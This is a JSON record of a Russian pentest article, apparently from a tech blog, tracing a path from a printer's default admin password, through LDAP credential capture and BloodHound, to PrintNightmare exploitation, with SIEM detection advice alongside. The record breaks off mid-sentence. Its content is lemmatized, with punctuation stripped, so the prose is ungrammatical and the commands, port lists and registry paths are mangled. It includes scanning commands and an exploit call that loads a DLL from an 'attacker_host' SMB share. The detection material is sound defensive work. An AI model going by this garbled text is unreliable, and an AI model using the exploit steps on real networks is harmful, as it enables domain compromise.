{
    "article_id": "725008",
    "article_name": "В начале был принтер. Как получить привилегии администратора домена, начав с принтера",
    "content": "прошлый год c команда решать поделиться несколько интересный вектор получение привилегия администратор домен отзыв первый  статья  оказываться полезный интересный наставать время продолжать вэт пост рассказывать получение доступ панель администрирование принтер приводить компрометация домен active directory помощь эксплуатация уязвимость printnightmare использование неограниченный делегирование аколлега jetcsirt дополнять пост рекомендация мониторинг каждый этап случай хотеть мониторять такой атака ваш siem краткий описание  схема  подробно  кат  внимание данный статья носить исключительно информационный характер предназначать образовательный цель кой случай пробовать атака чужой сеть  это неправильный точка зрение этика закон подобный действие разрешать выполнять либо свой инфраструктура либо разрешение владелец корпоративный сеть письменный начало получать доменный учетный запись принтер подключаться сеть рамка работа внутренний тестирование проникновение первый дело посмотреть какой протокол использоваться полезный находить далее сканировать сеть открытый tcpпорты 445 22 80 443 8080 8443 др попытка находить общий папка доступный неаутентифицировать пользователь выгружать список пользователь домен успешный находить уязвимость windowsмашинах который проэксплуатировать учетный запись удаваться  мониторять этап сканирование злоумышленник попадать сеть атаковать организация первый задача  осматриваться этап разведка очень шумный всам начало например использовать инструмент мasscan который сканировать популярный tcpпорты прикладной уровень который обычно работать вебприложение 80443808084438000 условие злоумышленник сканировать сетевой сегмент который дотягиваться средство защита обязательно замечать recon поэтому позаботиться ваш siem настраивать правило выявлять массовый обращение популярный порт например пять один узел внутренний сеть псевдокод srcip in internal_network and dstip in internal_network and ipprotocol in 617 and dstport in app_level_ports countdistinct dstport  10 помнить рано этап киллчейный который обнаруживать сеть плохой парень эффективно смочь останавливать атака уменьшать потенциальный импакт наставать время вебприложение спомощь утилита masscan находить хоста открывать tcpпорты который часто использоваться вебприложение 80 443 8080 8443 8000 внутренний сеть мочь сотня тысяча вебприложение посмотреть вручную нереально работа использовать eyewitness использовать gowitness проходиться весь вебприложение пытаться сделать скриншот сортировать категория например принтер сетевой устройство unauthorized инфраструктура сохранять отчет html использовать скоро сделать это удобный masscan p 80443808084438000 i eth0  tee web_portstxt cat web_portstxt  awk print 6  sort  uniq  web_hoststxt nmap p 80443808084438000 il web_hoststxt ox nmap_scan_webxml eyewitness x nmap_scan_webxml d eyew web  пример отчет eyewitness отчет eyewitness находить принтер kyocera вние мой опыт 90 случай устанавливать пароль умолчание adminadmin ивэтоты этот учетный данные попадать панель управление принтер  это лишь принтер взять  сказать  пример доступ административный панель принтер настройка принтер указывать настройка внешний адресный книга который использоваться загрузка информация пользователь active directory например отправка результат сканирование пользователь принтер учетный запись который обращаться ldapсерверу это использовать запускать свой хост responder который подымать число ldapсервер заменять имя ldapсервера ipадрес мой kali linux нажимать кнопка тест врезультат получать пароль узы domainreader открытый вид  пароль узы domainreader открытый вид     развитие атака получение привилегия администратор хост первый дело запускать коллектор bloodhound получать учетный запись писать прошлый  статья  путь повышение привилегия некорректный acl находить атака kerberoasting asreproasting удаваться подробный почитать   любимый password spray помогать это обидно  обнаруживать запуск коллектор bloodhound bloodhound определенный условие громко заявлять инфраструктура дело стандартный модуль bh обычно обращаться dc ldap какихлибо ограничение например запрашивать пользователь домен группа компьютер такой ldapзапросы отслеживать несколько нюанс вопервых нужно выполнять специальный настройка аудит вовторых событие который генерироваться мочь чрезвычайно массовый зависимость величина домен итак включать настройка изменение следующий ключ реестр dc добавлять параметр  dword 15 field engineering5  следующий путь hkey_local_machinesystemcurrentcontrolsetservicesntdsdiagnostic добавлять параметр  dword expensive search results threshold1  следующий путь hkey_local_machinesystemcurrentcontrolsetservicesntdsparameters добавлять параметр  dword inefficient search results threshold1  следующий путь hkey_local_machinesystemcurrentcontrolsetservicesntdsparameters этот настройка включать логирование ldapзапросов dc поэтому домен большой это нагружать dc siem рекомендоваться предварительно оценивать параметр домен подстраивать параметр  expensive search results threshold   inefficient search results threshold  соответственно зато настройка начинать получать событие 1644 который мочь отслеживать подозрительный обращение ктаким мочь относиться например  objectclass objectclassuser   выгрузка пользователь  objectclass objectclasscomputer   выгрузка информация обо компьютер домен зато несколько хост находить уязвимость printnightmare который позволять выполнять произвольный код имя nt authorityсистема спомощь общедоступный  эксплойт  получать ранее учеток domainreader dll выполнение который изменяться пароль локальный пользователь administrator проэксплуатировать уязвимость хост ca02domainlocal python cve20211675py domainlocalusernamepasswordvictimip attacker_hostsmb_share_namedll_namedll эксплуатация уязвимость printnightmare помощь crackmapexec проверять смениться пароль иура видеть заветный  pwn3d  который означать привилегия администратор хост  проверка изменение пароль ловить printnightmare атака printnightmare связанный два уязвимость  cve20211675 cve202134527 оба связанный служба print spooler  spoolsvexe  операционный система windows первый обнаруживать lpeуязвимость cve20211675 который позволять пользователь правый администратор добавлять система новый драйвер принтер dll который запускаться процесс  spoolsvexe  право system такой образ злоумышленник мочь локально повышать привилегия атаковать система этот уязвимость устранять путем разрешение добавлять новый драйвер принтер администратор однако вскоре исследователь обнаруживать уязвимость проэксплуатировать удаленный вектор данный rceспособу присваивать новый идентификатор  cve202134527  обычно использовать printnightmare речь идти именно он суть заключаться эксплуатация уязвимость функция протокол msrprn print system remote protocol именно   rpcaddprinterdriverex  позволять указывать свой параметр ипспуть библиотека другой ресурс который контролировать злоумышленник ипспуть  это путь файл директория сеть который иметь синтаксис  computer nameshared directory  такой образ злоумышленник создавать вредоносный dllбиблиотеку размещать свой ресурс например smbшаре затем удаленный вызов процедура rpc заставлять атаковать хост скачать данный dll запускать право system имя процесс spoolsvexe правильный настройка аудит printnightmare весьма шумный понимать принцип действие ключевой момент успешный атака являться загрузка вредоносный драйвер атаковать хост кроме процесс эксплуатация осуществляться обращение файл внутри директория  windowssystem32spooldriversx643   ключ реестр  machinesystemcurrentcontrolsetcontrolprint jetcsirt детектировать данный атака два способ  простой менее сложный точный первый способ заключаться отслеживание специфичный событие windows5145 anetwork share object was checked to see whether client can be granted desired access который обращение происходить шар  ipc  именовать канал  spools  маска доступ  0x3  readdata or listdirectory writedata or addfile  генерация событие 5145 политика расширять аудит нужно вклю",
    "tags": [
        "хакер",
        "взлом принтеров",
        "killchain"
    ]
}